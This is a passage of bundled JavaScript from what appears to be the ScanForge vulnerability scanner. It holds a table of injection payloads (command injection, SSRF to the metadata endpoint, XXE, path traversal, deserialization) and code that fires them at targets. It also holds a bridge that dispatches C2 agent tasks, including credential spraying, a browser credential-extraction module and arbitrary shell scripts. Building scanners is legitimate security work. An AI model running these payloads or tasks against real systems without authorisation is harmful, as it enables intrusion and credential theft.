          // Time-based
          payload: `; sleep 5`,
          injection: "url_param",
          strategy: "time_based"
        },
        {
          // Computation proof
          payload: `$(expr {{MATH_EXPR}})`,
          injection: "url_param",
          strategy: "computation"
        }
      ],
      // ── SSRF Proof ──
      ssrf: [
        {
          payload: `http://{{OOB_DOMAIN}}/ssrf/{{CANARY}}`,
          injection: "url_param",
          strategy: "oob"
        },
        {
          // Behavioral: request internal metadata endpoint
          payload: `http://169.254.169.254/latest/meta-data/`,
          injection: "url_param",
          strategy: "behavioral"
        }
      ],
      // ── XXE Proof ──
      xxe: [
        {
          payload: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{{OOB_DOMAIN}}/xxe/{{CANARY}}">]><foo>&xxe;</foo>`,
          injection: "body",
          strategy: "oob"
        },
        {
          payload: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>`,
          injection: "body",
          strategy: "reflection"
        }
      ],
      // ── SSTI Proof ──
      ssti: [
        {
          payload: `{{7*7}}`,
          injection: "url_param",
          strategy: "computation"
        },
        {
          payload: `${"{{"}"{{MATH_EXPR}}"${"}}"}`,
          injection: "url_param",
          strategy: "computation"
        },
        {
          payload: `{{CANARY}}`,
          injection: "url_param",
          strategy: "reflection"
        }
      ],
      // ── LFI/Path Traversal Proof ──
      lfi: [
        {
          payload: `../../../../etc/passwd`,
          injection: "url_param",
          strategy: "reflection"
        },
        {
          payload: `....//....//....//etc/passwd`,
          injection: "url_param",
          strategy: "reflection"
        }
      ],
      // ── Open Redirect Proof ──
      redirect: [
        {
          payload: `//{{CANARY}}.example.com`,
          injection: "url_param",
          strategy: "behavioral"
        }
      ],
      // ── CSRF Proof ──
      csrf: [
        {
          // Behavioral: check for missing CSRF token in state-changing request
          payload: `{{CANARY}}`,
          injection: "body",
          strategy: "behavioral"
        }
      ],
      // ── Insecure Deserialization Proof ──
      deserialization: [
        {
          // Time-based: Java sleep gadget
          payload: `rO0ABXNyABFqYXZhLmxhbmcuUnVudGltZQ==`,
          injection: "body",
          strategy: "time_based"
        },
        {
          // OOB: DNS callback via deserialization
          payload: `{{OOB_PAYLOAD}}`,
          injection: "body",
          strategy: "oob"
        }
      ]
    };
    ProofEngine = class {
      constructor(config2 = {}) {
        this.oobCallbacks = /* @__PURE__ */ new Map();
        /** Tracks blocked proof attempts for reporting */
        this.blockedAttempts = [];
        this.config = {
          timeoutMs: config2.timeoutMs ?? 1e4,
          enableOOB: config2.enableOOB ?? false,
          oobDomain: config2.oobDomain ?? "oob.scanforge.local",
          timeThresholdMs: config2.timeThresholdMs ?? 4e3,
          maxRetries: config2.maxRetries ?? 2,
          skipInfoLevel: config2.skipInfoLevel ?? true
        };
        this.safetyProfile = config2.safetyProfile ?? DEFAULT_SAFETY_PROFILE;
      }
      /** Get blocked proof attempts (for audit/reporting) */
      getBlockedAttempts() {
        return [...this.blockedAttempts];
      }
      /** Get the active safety profile */
      getSafetyProfile() {
        return this.safetyProfile;
      }
      /**
       * Verify a batch of findings with proof-based re-exploitation.
       * Returns findings with updated confidence and proof results.
       */
      async verifyFindings(findings, target, scanConfig) {
        const proofs = [];
        const toVerify = findings.filter((f) => {
          if (this.config.skipInfoLevel && f.severity === "info") return false;
          return f.evidence?.request || f.evidence?.matchedPattern;
        });
        console.log(`[ProofEngine] Verifying ${toVerify.length}/${findings.length} findings`);
        for (const finding of toVerify) {
          try {
            const proof = await this.proveFinding(finding, target, scanConfig);
            proofs.push(proof);
            finding.confidence = Math.min(100, Math.max(0, finding.confidence + proof.confidenceAdjustment));
            if (!finding.evidence.data) finding.evidence.data = {};
            finding.evidence.data.proofStatus = proof.status;
            finding.evidence.data.proofStrategy = proof.strategy;
            finding.evidence.data.proofHash = proof.proofHash;
            if (proof.status === "confirmed") {
              finding.evidence.data.proofDescription = proof.description;
              if (proof.proofRequest) finding.evidence.data.proofRequest = proof.proofRequest;
              if (proof.proofResponse) finding.evidence.data.proofResponse = proof.proofResponse;
            }
          } catch (err) {
            proofs.push({
              findingId: finding.id,
              status: "error",
              strategy: "reflection",
              confidenceAdjustment: 0,
              description: `Proof attempt failed: ${err.message}`,
              proofHash: hashProofChain(finding, "error", "", err.message),
              verifiedAt: Date.now(),
              durationMs: 0
            });
          }
        }
        for (const finding of findings) {
          const proof = proofs.find((p) => p.findingId === finding.id);
          if (!proof && (finding.severity === "critical" || finding.severity === "high")) {
            if (!finding.evidence.data) finding.evidence.data = {};
            finding.evidence.data.proofStatus = "unverified";
            finding.evidence.data.proofNote = "High/critical finding not yet verified \u2014 treat as potential false positive";
          }
        }
        return { findings, proofs };
      }
      /**
       * Attempt to prove a single finding using the best available strategy.
       */
      async proveFinding(finding, target, scanConfig) {
        const startTime = Date.now();
        const vulnClass = classifyFinding(finding);
        const payloads = PROOF_PAYLOADS[vulnClass] || [];
        if (payloads.length === 0) {
          return this.behavioralProof(finding, target, startTime);
        }
        const strategyOrder = ["reflection", "computation", "time_based", "oob", "error_based", "behavioral"];
        for (const strategy of strategyOrder) {
          const candidatePayloads = payloads.filter((p) => p.strategy === strategy);
          if (candidatePayloads.length === 0) continue;
          if (strategy === "oob" && !this.config.enableOOB) continue;
          for (const payload of candidatePayloads) {
            const canary = generateCanary();
            const math = generateMathProof();
            let actualPayload = payload.payload.replace(/\{\{CANARY\}\}/g, canary).replace(/\{\{OOB_DOMAIN\}\}/g, this.config.oobDomain).replace(/\{\{MATH_EXPR\}\}/g, math.expression);
            const result = await this.executeProofRequest(finding, target, actualPayload, payload, canary, math, scanConfig);
            if (result) {
              return {
                ...result,
                durationMs: Date.now() - startTime
              };
            }
          }
        }
        return {
          findingId: finding.id,
          status: "unconfirmed",
          strategy: "reflection",
          confidenceAdjustment: -15,
          description: `Could not verify ${vulnClass} finding \u2014 no proof strategy succeeded`,
          proofHash: hashProofChain(finding, "unconfirmed", "", ""),
          verifiedAt: Date.now(),
          durationMs: Date.now() - startTime
        };
      }
      /**
       * Execute a proof request against the target.
       */
      async executeProofRequest(finding, target, payload, payloadDef, canary, math, scanConfig) {
        try {
          const baseUrl = this.buildTargetUrl(finding, target);
          if (!baseUrl) return null;
          const method = payloadDef.injection === "body" ? "POST" : "GET";
          const safetyCheck = checkProofSafety(payload, method, baseUrl, this.safetyProfile);
          if (!safetyCheck.allowed) {
            this.blockedAttempts.push({
              payload: payload.slice(0, 200),
              reason: safetyCheck.reason,
              targetUrl: baseUrl,
              timestamp: Date.now()
            });
            console.debug(`[ProofEngine] BLOCKED: ${safetyCheck.reason} | target=${baseUrl}`);
            return null;
          }
          recordProofAttempt(baseUrl);
          const controller = new AbortController();
          const timeout = setTimeout(() => controller.abort(), this.config.timeoutMs);
          let proofRequest = "";
          let proofResponse = "";
          try {
            const url = new URL(baseUrl);
            const headers = {
              "User-Agent": scanConfig?.userAgent || "ScanForge/1.0 ProofEngine"
            };
            if (payloadDef.injection === "url_param") {
              const paramName = payloadDef.paramName || this.extractParamName(finding) || "q";
              url.searchParams.set(paramName, payload);
              proofRequest = `GET ${url.toString()}`;
            } else if (payloadDef.injection === "body") {
              proofRequest = `POST ${url.toString()} [body: ${payload.slice(0, 200)}]`;
            } else if (payloadDef.injection === "header") {
              headers["X-Proof-Test"] = payload;
              proofRequest = `GET ${url.toString()} [header: X-Proof-Test=${payload.slice(0, 100)}]`;
            }
            const requestStart = Date.now();
            const fetchOptions = {
              method: payloadDef.injection === "body" ? "POST" : "GET",
              headers,
              signal: controller.signal,
              redirect: "follow"
            };
            if (payloadDef.injection === "body") {
              fetchOptions.body = payload;
              headers["Content-Type"] = finding.evidence?.request?.includes("json") ? "application/json" : "application/x-www-form-urlencoded";
            }
            const response = await fetch(url.toString(), fetchOptions);
            const responseTime = Date.now() - requestStart;
            const responseBody = await response.text();
            proofResponse = responseBody.slice(0, 2e3);
            if (payloadDef.strategy === "reflection") {
              if (responseBody.includes(canary)) {
                return {
                  findingId: finding.id,
                  status: "confirmed",
                  strategy: "reflection",
                  confidenceAdjustment: 30,
                  description: `Reflected canary "${canary}" found in response body \u2014 ${finding.title} confirmed exploitable`,
                  canary,
                  proofRequest,
                  proofResponse: this.extractProofExcerpt(responseBody, canary),
                  proofHash: hashProofChain(finding, "reflection", canary, responseBody),
                  verifiedAt: Date.now(),
                  durationMs: 0
                };
              }
            }
            if (payloadDef.strategy === "computation") {
              if (responseBody.includes(math.expected)) {
                return {
                  findingId: finding.id,
                  status: "confirmed",
                  strategy: "computation",
                  confidenceAdjustment: 35,
                  description: `Computation proof: ${math.expression} = ${math.expected} found in response \u2014 server executed injected expression`,
                  canary: math.expression,
                  proofRequest,
                  proofResponse: this.extractProofExcerpt(responseBody, math.expected),
                  proofHash: hashProofChain(finding, "computation", math.expression, responseBody),
                  verifiedAt: Date.now(),
                  durationMs: 0
                };
              }
            }
            if (payloadDef.strategy === "time_based") {
              if (responseTime >= this.config.timeThresholdMs) {
                return {
                  findingId: finding.id,
                  status: "confirmed",
                  strategy: "time_based",
                  confidenceAdjustment: 25,
                  description: `Time-based proof: response delayed ${responseTime}ms (threshold: ${this.config.timeThresholdMs}ms) \u2014 confirms blind injection`,
                  proofRequest,
                  proofResponse: `Response time: ${responseTime}ms (expected \u2265${this.config.timeThresholdMs}ms)`,
                  proofHash: hashProofChain(finding, "time_based", String(responseTime), ""),
                  verifiedAt: Date.now(),
                  durationMs: 0
                };
              }
            }
            if (payloadDef.strategy === "error_based") {
              const errorPatterns = [
                /SQL syntax.*?near/i,
                /mysql_fetch/i,
                /ORA-\d{5}/i,
                /PostgreSQL.*?ERROR/i,
                /Microsoft.*?ODBC/i,
                /XPATH syntax error/i,
                /EXTRACTVALUE/i,
                canary
                // Our injected canary in error output
              ];
              for (const pattern of errorPatterns) {
                const match = typeof pattern === "string" ? responseBody.includes(pattern) : pattern.test(responseBody);
                if (match) {
                  return {
                    findingId: finding.id,
                    status: "confirmed",
                    strategy: "error_based",
                    confidenceAdjustment: 20,
                    description: `Error-based proof: distinctive database error triggered \u2014 confirms SQL injection vector`,
                    canary,
                    proofRequest,
                    proofResponse: this.extractErrorExcerpt(responseBody),
                    proofHash: hashProofChain(finding, "error_based", canary, responseBody),
                    verifiedAt: Date.now(),
                    durationMs: 0
                  };
                }
              }
            }
            if (payloadDef.strategy === "oob") {
              this.oobCallbacks.set(canary, { findingId: finding.id });
              await new Promise((r) => setTimeout(r, 3e3));
              const callback = this.oobCallbacks.get(canary);
              if (callback?.receivedAt) {
                return {
                  findingId: finding.id,
                  status: "confirmed",
                  strategy: "oob",
                  confidenceAdjustment: 35,
                  description: `OOB proof: received callback at ${this.config.oobDomain} \u2014 confirms blind ${classifyFinding(finding)} vulnerability`,
                  canary,
                  proofRequest,
                  proofResponse: `OOB callback received at ${new Date(callback.receivedAt).toISOString()}`,
                  proofHash: hashProofChain(finding, "oob", canary, String(callback.receivedAt)),
                  verifiedAt: Date.now(),
                  durationMs: 0
                };
              }
              this.oobCallbacks.delete(canary);
            }
          } finally {
            clearTimeout(timeout);
          }
        } catch (err) {
          if (err.name === "AbortError") return null;
          console.debug(`[ProofEngine] Proof request error: ${err.message}`);
        }
        return null;
      }
      /**
       * Behavioral proof: compare baseline response with payload response.
       */
      async behavioralProof(finding, target, startTime) {
        return {
          findingId: finding.id,
          status: "likely",
          strategy: "behavioral",
          confidenceAdjustment: -5,
          description: `No specific proof strategy available for this finding class \u2014 behavioral analysis suggests likely vulnerability`,
          proofHash: hashProofChain(finding, "behavioral", "", ""),
          verifiedAt: Date.now(),
          durationMs: Date.now() - startTime
        };
      }
      // ─── OOB Callback Registration ────────────────────────────────────────────
      /** Register an OOB callback receipt (called by the OOB server) */
      registerOOBCallback(canary) {
        const entry = this.oobCallbacks.get(canary);
        if (entry) {
          entry.receivedAt = Date.now();
          return true;
        }
        return false;
      }
      /** Get pending OOB callbacks */
      getPendingOOBCallbacks() {
        return Array.from(this.oobCallbacks.entries()).filter(([, v]) => !v.receivedAt).map(([k]) => k);
      }
      // ─── Helpers ──────────────────────────────────────────────────────────────
      buildTargetUrl(finding, target) {
        if (finding.evidence?.request) {
          const urlMatch = finding.evidence.request.match(/(?:GET|POST|PUT|DELETE)\s+(https?:\/\/[^\s]+)/i);
          if (urlMatch) return urlMatch[1];
        }
        const protocol = finding.port === 443 ? "https" : "http";
        const port = finding.port && finding.port !== 80 && finding.port !== 443 ? `:${finding.port}` : "";
        return `${protocol}://${target.value}${port}/`;
      }
      extractParamName(finding) {
        if (finding.evidence?.request) {
          const paramMatch = finding.evidence.request.match(/[?&]([^=]+)=/);
          if (paramMatch) return paramMatch[1];
        }
        return null;
      }
      extractProofExcerpt(body, needle) {
        const idx = body.indexOf(needle);
        if (idx === -1) return body.slice(0, 500);
        const start = Math.max(0, idx - 100);
        const end = Math.min(body.length, idx + needle.length + 100);
        return `...${body.slice(start, end)}...`;
      }
      extractErrorExcerpt(body) {
        const errorPatterns = [
          /.*SQL syntax.*?\n/i,
          /.*ORA-\d{5}.*?\n/i,
          /.*PostgreSQL.*?ERROR.*?\n/i,
          /.*ODBC.*?\n/i
        ];
        for (const pattern of errorPatterns) {
          const match = body.match(pattern);
          if (match) return match[0].trim().slice(0, 500);
        }
        return body.slice(0, 500);
      }
    };
  }
});

// server/scanforge/engine/ember-bridge.ts
import { randomUUID as randomUUID2 } from "crypto";
function buildEmberScanTasks(request) {
  const tasks = [];
  switch (request.scanType) {
    case "port_scan":
      tasks.push(buildPortScanTask(request));
      break;
    case "service_fingerprint":
      tasks.push(buildServiceFingerprintTask(request));
      break;
    case "web_scan":
      tasks.push(...buildWebScanTasks(request));
      break;
    case "credential_test":
      tasks.push(buildCredentialTestTask(request));
      break;
    case "network_vuln":
      tasks.push(buildNetworkVulnTask(request));
      break;
    case "smb_enum":
      tasks.push(buildSMBEnumTask(request));
      break;
    case "ldap_enum":
      tasks.push(buildLDAPEnumTask(request));
      break;
    case "dns_enum":
      tasks.push(buildDNSEnumTask(request));
      break;
    case "cert_audit":
      tasks.push(buildCertAuditTask(request));
      break;
    case "config_audit":
      tasks.push(buildConfigAuditTask(request));
      break;
    case "custom_script":
      tasks.push(buildCustomScriptTask(request));
      break;
  }
  return tasks;
}
function buildPortScanTask(req) {
  const hosts = req.target.hosts.join(" ");
  const ports = req.target.ports || "1-1024";
  const intensity = req.config.intensity;
  const timing = intensity <= 2 ? "-T2" : intensity <= 3 ? "-T3" : "-T4";
  const stealth = intensity <= 2 ? "-sS" : "-sT";
  const extraFlags = [
    req.config.osDetection ? "-O" : "",
    req.config.versionDetection ? "-sV" : "",
    req.config.rateLimit ? `--max-rate ${req.config.rateLimit}` : ""
  ].filter(Boolean).join(" ");
  return {
    taskId: `sf-portscan-${req.requestId}`,
    type: "shell_command",
    priority: req.priority,
    params: {
      command: `naabu -p ${ports} -host ${hosts} -json -o /tmp/sf-scan-${req.requestId}.json`,
      outputFile: `/tmp/sf-scan-${req.requestId}.xml`,
      parseFormat: "scanforge-discovery_xml"
    },
    attackTechnique: "T1046",
    timeoutSeconds: req.timeoutSeconds,
    requiresElevation: intensity <= 2,
    // SYN scan requires root
    createdAt: Date.now(),
    assignedBy: "scanforge_bridge"
  };
}
function buildServiceFingerprintTask(req) {
  const hosts = req.target.hosts.join(" ");
  const ports = req.target.ports || "1-1024";
  return {
    taskId: `sf-svcfp-${req.requestId}`,
    type: "shell_command",
    priority: req.priority,
    params: {
      command: `httpx -probe -tech-detect -status-code -title -json -o /tmp/sf-svcfp-${req.requestId}.json -l <(echo ${hosts})`,
      outputFile: `/tmp/sf-svcfp-${req.requestId}.xml`,
      parseFormat: "scanforge-discovery_xml"
    },
    attackTechnique: "T1046",
    timeoutSeconds: req.timeoutSeconds,
    requiresElevation: false,
    createdAt: Date.now(),
    assignedBy: "scanforge_bridge"
  };
}
function buildWebScanTasks(req) {
  const tasks = [];
  const urls = req.target.urls || req.target.hosts.map((h) => `http://${h}`);
  tasks.push({
    taskId: `sf-webdisc-${req.requestId}`,
    type: "shell_command",
    priority: req.priority,
    params: {
      command: buildWebDiscoveryCommand(urls, req.config),
      parseFormat: "json"
    },
    attackTechnique: "T1595.002",
    timeoutSeconds: req.timeoutSeconds,
    requiresElevation: false,
    createdAt: Date.now(),
    assignedBy: "scanforge_bridge"
  });
  tasks.push({
    taskId: `sf-webvuln-${req.requestId}`,
    type: "execute_module",
    priority: req.priority,
    params: {
      moduleId: "ember.recon.service_fingerprint",
      scanType: "web_vuln",
      targets: urls,
      checks: [
        "sql_injection",
        "xss_reflected",
        "xss_stored",
        "command_injection",
        "path_traversal",
        "ssrf",
        "open_redirect",
        "header_injection",
        "cors_misconfiguration",
        "security_headers"
      ],
      config: {
        followRedirects: req.config.followRedirects ?? true,
        maxDepth: 3,
        rateLimit: req.config.rateLimit,
        auth: req.config.auth
      }
    },
    attackTechnique: "T1190",
    timeoutSeconds: req.timeoutSeconds,
    requiresElevation: false,
    createdAt: Date.now(),
    assignedBy: "scanforge_bridge"
  });
  return tasks;
}
function buildCredentialTestTask(req) {
  const services = req.target.services || [];
  return {
    taskId: `sf-credtest-${req.requestId}`,
    type: "execute_module",
    priority: req.priority,
    params: {
      moduleId: "ember.cred.browser_extract",
      scanType: "credential_spray",
      targets: services,
      wordlists: req.config.wordlists || {
        usernames: ["admin", "root", "administrator", "sa", "postgres", "mysql"],
        passwords: ["admin", "password", "123456", "root", "toor", "changeme"]
      },
      config: {
        maxConcurrent: req.config.maxConcurrent,
        rateLimit: req.config.rateLimit,
        lockoutThreshold: 3
        // Stop after 3 failures per account
      }
    },
    attackTechnique: "T1110.003",
    timeoutSeconds: req.timeoutSeconds,
    requiresElevation: false,
    createdAt: Date.now(),
    assignedBy: "scanforge_bridge"
  };
}
function buildNetworkVulnTask(req) {
  const hosts = req.target.hosts.join(" ");
  const nseScripts = req.config.nseScripts || [
    "vuln",
    "exploit",
    "auth",
    "default"
  ];
  return {
    taskId: `sf-netvuln-${req.requestId}`,
    type: "shell_command",
    priority: req.priority,
    params: {
      command: `scanforge-discovery --script=${nseScripts.join(",")} -p ${req.target.ports || "1-65535"} -oX /tmp/sf-netvuln-${req.requestId}.xml ${hosts}`,
      outputFile: `/tmp/sf-netvuln-${req.requestId}.xml`,
      parseFormat: "scanforge-discovery_xml"
    },
    attackTechnique: "T1046",
    timeoutSeconds: req.timeoutSeconds,
    requiresElevation: true,
    createdAt: Date.now(),
    assignedBy: "scanforge_bridge"
  };
}
function buildSMBEnumTask(req) {
  const hosts = req.target.hosts.join(" ");
  return {
    taskId: `sf-smbenum-${req.requestId}`,
    type: "shell_command",
    priority: req.priority,
    params: {
      command: `nuclei -t cves/smb/ -t network/smb/ -target ${hosts} -json -o /tmp/sf-smb-${req.requestId}.json`,
      outputFile: `/tmp/sf-smb-${req.requestId}.xml`,
      parseFormat: "scanforge-discovery_xml"
    },
    attackTechnique: "T1135",
    timeoutSeconds: req.timeoutSeconds,
    requiresElevation: false,
    createdAt: Date.now(),
    assignedBy: "scanforge_bridge"
  };
}
function buildLDAPEnumTask(req) {
  const host = req.target.hosts[0];
  const auth = req.config.auth;
  const ldapCmd = auth?.type === "basic" ? `ldapsearch -H ldap://${host} -D "${auth.credentials.username}" -w "${auth.credentials.password}" -b "" "(objectClass=*)" -LLL` : `ldapsearch -H ldap://${host} -x -b "" "(objectClass=*)" -LLL`;
  return {
    taskId: `sf-ldapenum-${req.requestId}`,
    type: "shell_command",
    priority: req.priority,
    params: {
      command: `${ldapCmd} > /tmp/sf-ldap-${req.requestId}.txt 2>&1; nuclei -t network/ldap/ -target ${host} -json -o /tmp/sf-ldap-${req.requestId}.json`,
      outputFile: `/tmp/sf-ldap-${req.requestId}.xml`,
      parseFormat: "scanforge-discovery_xml"
    },
    attackTechnique: "T1087.002",
    timeoutSeconds: req.timeoutSeconds,
    requiresElevation: false,
    createdAt: Date.now(),
    assignedBy: "scanforge_bridge"
  };
}
function buildDNSEnumTask(req) {
  const host = req.target.hosts[0];
  return {
    taskId: `sf-dnsenum-${req.requestId}`,
    type: "shell_command",
    priority: req.priority,
    params: {
      command: `nuclei -t dns/ -target ${host} -json -o /tmp/sf-dns-${req.requestId}.json`,
      outputFile: `/tmp/sf-dns-${req.requestId}.xml`,
      parseFormat: "scanforge-discovery_xml"
    },
    attackTechnique: "T1018",
    timeoutSeconds: req.timeoutSeconds,
    requiresElevation: false,
    createdAt: Date.now(),
    assignedBy: "scanforge_bridge"
  };
}
function buildCertAuditTask(req) {
  const hosts = req.target.hosts.join(" ");
  const ports = req.target.ports || "443,8443,993,995,636";
  return {
    taskId: `sf-certaudit-${req.requestId}`,
    type: "shell_command",
    priority: req.priority,
    params: {
      command: `nuclei -t ssl/ -t cves/ssl/ -target ${hosts} -json -o /tmp/sf-cert-${req.requestId}.json`,
      outputFile: `/tmp/sf-cert-${req.requestId}.xml`,
      parseFormat: "scanforge-discovery_xml"
    },
    attackTechnique: "T1557",
    timeoutSeconds: req.timeoutSeconds,
    requiresElevation: false,
    createdAt: Date.now(),
    assignedBy: "scanforge_bridge"
  };
}
function buildConfigAuditTask(req) {
  return {
    taskId: `sf-cfgaudit-${req.requestId}`,
    type: "execute_module",
    priority: req.priority,
    params: {
      moduleId: "ember.cognitive.env_analyzer",
      scanType: "config_audit",
      checks: [
        "password_policy",
        "firewall_rules",
        "open_shares",
        "writable_directories",
        "suid_binaries",
        "cron_jobs",
        "service_permissions",
        "registry_acls",
        "certificate_expiry",
        "patch_level"
      ]
    },
    attackTechnique: "T1082",
    timeoutSeconds: req.timeoutSeconds,
    requiresElevation: true,
    createdAt: Date.now(),
    assignedBy: "scanforge_bridge"
  };
}
function buildCustomScriptTask(req) {
  const scripts = req.config.scripts || [];
  return {
    taskId: `sf-custom-${req.requestId}`,
    type: "shell_command",
    priority: req.priority,
    params: {
      command: scripts.join(" && "),
      parseFormat: "raw"
    },
    timeoutSeconds: req.timeoutSeconds,
    requiresElevation: false,
    createdAt: Date.now(),
    assignedBy: "scanforge_bridge"
  };
}
function buildWebDiscoveryCommand(urls, config2) {
  const paths = config2.wordlists?.directories || [
    "/admin",
    "/login",
    "/api",
    "/wp-admin",
    "/phpmyadmin",
    "/.env",
    "/.git/config",
    "/robots.txt",
    "/sitemap.xml",
    "/server-status",
    "/server-info",
    "/.htaccess",
    "/web.config",
    "/backup",
    "/test",
    "/debug",
    "/console",
    "/swagger",
    "/api/v1",
    "/graphql",
    "/.well-known/security.txt"
  ];
  const urlList = urls.map((u) => u.replace(/\/$/, "")).join(" ");
  const pathList = paths.join(" ");
  return `for url in ${urlList}; do for path in ${pathList}; do code=$(curl -s -o /dev/null -w "%{http_code}" -m 5 "$url$path" 2>/dev/null); if [ "$code" != "000" ] && [ "$code" != "404" ]; then echo "$url$path:$code"; fi; done; done`;
}
function normalizeEmberResults(taskResults, intelligence, request) {
  const findings = [];
  const errors = [];
  let totalDuration = 0;
  for (const result of taskResults) {
    totalDuration += result.durationMs;
    if (result.status === "failed" || result.status === "timeout") {
      errors.push(`Task ${result.taskId}: ${result.error || result.status}`);
      continue;
    }
    if (result.output) {
      const parsed = parseTaskOutput(result, request);
      findings.push(...parsed);
    }
    for (const artifact of result.artifacts) {
      if (artifact.type === "intelligence") {
        const finding = artifactToFinding(artifact, request);
        if (finding) findings.push(finding);
      }
    }
  }
  for (const intel of intelligence) {
    const finding = intelligenceToFinding(intel, request);
    if (finding) findings.push(finding);
  }
  const deduped = deduplicateFindings(findings);
  const overallStatus = taskResults.every((r) => r.status === "success") ? "completed" : taskResults.some((r) => r.status === "success") ? "partial" : taskResults.some((r) => r.status === "timeout") ? "timeout" : "failed";
  return {
    requestId: request.requestId,
    status: overallStatus,
    findings: deduped,
    rawIntelligence: intelligence,
    durationMs: totalDuration,
    agentId: taskResults[0]?.taskId.split("-")[0] || "unknown",
    errors,
    completedAt: Date.now()
  };
}
function parseTaskOutput(result, request) {
  const findings = [];
  const output = result.output || "";
  if (output.includes(":200") || output.includes(":301") || output.includes(":403")) {
    const lines = output.split("\n").filter((l) => l.trim());
    for (const line of lines) {
      const match = line.match(/^(.+):(\d{3})$/);
      if (match) {
        const [, url, code] = match;
        const statusCode = parseInt(code);
        if (statusCode === 200 && /\.(env|git|htaccess|config)/.test(url)) {
          findings.push({
            id: `sf-ember-${randomUUID2().slice(0, 8)}`,
            scanId: request.scanId,
            templateId: request.templateId || "ember-web-discovery",
            title: `Sensitive File Exposed: ${url.split("/").pop()}`,
            description: `The file at ${url} is publicly accessible (HTTP ${statusCode}). This may expose sensitive configuration data, credentials, or internal paths.`,
            severity: "high",
            confidence: "confirmed",
            url,
            host: new URL(url).hostname,
            port: parseInt(new URL(url).port) || (url.startsWith("https") ? 443 : 80),
            evidence: `HTTP ${statusCode} response for ${url}`,
            remediation: "Restrict access to sensitive files via web server configuration. Add deny rules for .env, .git, .htaccess, and similar files.",
            cweId: "CWE-538",
            cvssScore: 7.5,
            tags: ["sensitive-file", "information-disclosure", "owasp-a01"],
            detectedAt: Date.now(),
            verifiedAt: null,
            falsePositive: false
          });
        } else if (statusCode === 200 && /admin|console|debug|swagger|graphql/.test(url)) {
          findings.push({
            id: `sf-ember-${randomUUID2().slice(0, 8)}`,
            scanId: request.scanId,
            templateId: request.templateId || "ember-web-discovery",
            title: `Administrative Interface Exposed: ${url}`,
            description: `An administrative or debug interface was found at ${url}. This could allow unauthorized access to management functions.`,
            severity: "medium",
            confidence: "confirmed",
            url,
            host: new URL(url).hostname,
            port: parseInt(new URL(url).port) || (url.startsWith("https") ? 443 : 80),
            evidence: `HTTP ${statusCode} response for ${url}`,
            remediation: "Restrict access to administrative interfaces using IP whitelisting, authentication, or VPN requirements.",
            cweId: "CWE-284",
            cvssScore: 5.3,
            tags: ["admin-interface", "access-control", "owasp-a01"],
            detectedAt: Date.now(),
            verifiedAt: null,
            falsePositive: false
          });
        }
      }
    }
  }
  return findings;
}
function artifactToFinding(artifact, request) {
  if (artifact.type !== "intelligence") return null;
  try {
    const data = artifact.data ? JSON.parse(Buffer.from(artifact.data, "base64").toString()) : {};
    return {
      id: `sf-ember-${randomUUID2().slice(0, 8)}`,
      scanId: request.scanId,
      templateId: request.templateId || "ember-artifact",
      title: artifact.name,
      description: artifact.description,
      severity: data.severity || "info",
      confidence: "tentative",
      url: data.url || request.target.hosts[0],
      host: data.host || request.target.hosts[0],
      port: data.port || 0,
      evidence: data.evidence || artifact.description,
      remediation: data.remediation || "Review the finding and apply appropriate remediation.",
      cweId: data.cweId,
      cvssScore: data.cvssScore,
      tags: ["ember-agent", ...data.tags || []],
      detectedAt: Date.now(),
      verifiedAt: null,
      falsePositive: false
    };
  } catch {
    return null;
  }
}
function intelligenceToFinding(intel, request) {
  if (intel.type !== "vulnerability_found") return null;
  const data = intel.data;
  return {
    id: `sf-ember-${randomUUID2().slice(0, 8)}`,
    scanId: request.scanId,
    templateId: request.templateId || "ember-intelligence",
    title: data.title || `Vulnerability: ${data.type || "Unknown"}`,
    description: data.description || "Vulnerability detected by Ember agent during internal scan.",
    severity: mapConfidenceToSeverity(intel.confidence, data.severity),
    confidence: intel.confidence >= 80 ? "confirmed" : intel.confidence >= 50 ? "tentative" : "tentative",
    url: data.url || data.host || request.target.hosts[0],
    host: data.host || request.target.hosts[0],
    port: data.port || 0,
    evidence: data.evidence || JSON.stringify(data),
    remediation: data.remediation || "Review and remediate the identified vulnerability.",
    cweId: data.cweId,
    cveId: data.cveId,
    cvssScore: data.cvssScore,
    tags: ["ember-agent", "internal-scan", ...data.tags || []],
    detectedAt: Date.now(),
    verifiedAt: intel.confidence >= 80 ? Date.now() : null,
    falsePositive: false
  };
}
function mapConfidenceToSeverity(confidence, existingSeverity) {
  if (existingSeverity && ["critical", "high", "medium", "low", "info"].includes(existingSeverity)) {
    return existingSeverity;
  }
  if (confidence >= 90) return "high";
  if (confidence >= 70) return "medium";
  if (confidence >= 50) return "low";
  return "info";
}
function deduplicateFindings(findings) {
  const seen = /* @__PURE__ */ new Map();
  for (const finding of findings) {
    const key = `${finding.host}:${finding.port}:${finding.cweId || finding.title}`;
    const existing = seen.get(key);
    if (!existing) {
      seen.set(key, finding);
    } else {
      const severityOrder = ["critical", "high", "medium", "low", "info"];
      const existingSev = severityOrder.indexOf(existing.severity);
      const newSev = severityOrder.indexOf(finding.severity);
      if (newSev < existingSev) {
        seen.set(key, finding);
      }
    }
  }
  return Array.from(seen.values());
}
var ScanForgeEmberBridge;
var init_ember_bridge = __esm({
  "server/scanforge/engine/ember-bridge.ts"() {
    "use strict";
    ScanForgeEmberBridge = class {
      constructor() {
        this.pendingRequests = /* @__PURE__ */ new Map();
        this.completedResults = /* @__PURE__ */ new Map();
        this.taskToRequest = /* @__PURE__ */ new Map();
      }
      // taskId -> requestId
      /**
       * Submit a scan request to be executed by an Ember agent.
       */
      async submitScan(request) {
        this.pendingRequests.set(request.requestId, request);
        const tasks = buildEmberScanTasks(request);
        for (const task of tasks) {
          this.taskToRequest.set(task.taskId, request.requestId);
        }
        console.log(
          `[ScanForge-Ember] Submitted scan ${request.requestId} (${request.scanType}) \u2192 ${tasks.length} task(s) for agent dispatch`
        );
        return { tasks, requestId: request.requestId };
      }
      /**
       * Process results from an Ember agent beacon.
       * Called when the C2 receives task results from an agent.
       */
      processAgentResults(taskResults, intelligence) {
        const requestId = taskResults.map((r) => this.taskToRequest.get(r.taskId)).find(Boolean);
        if (!requestId) return null;
        const request = this.pendingRequests.get(requestId);
        if (!request) return null;
        const result = normalizeEmberResults(taskResults, intelligence, request);
        this.completedResults.set(requestId, result);
        this.pendingRequests.delete(requestId);
        for (const tr of taskResults) {
          this.taskToRequest.delete(tr.taskId);
        }
        console.log(
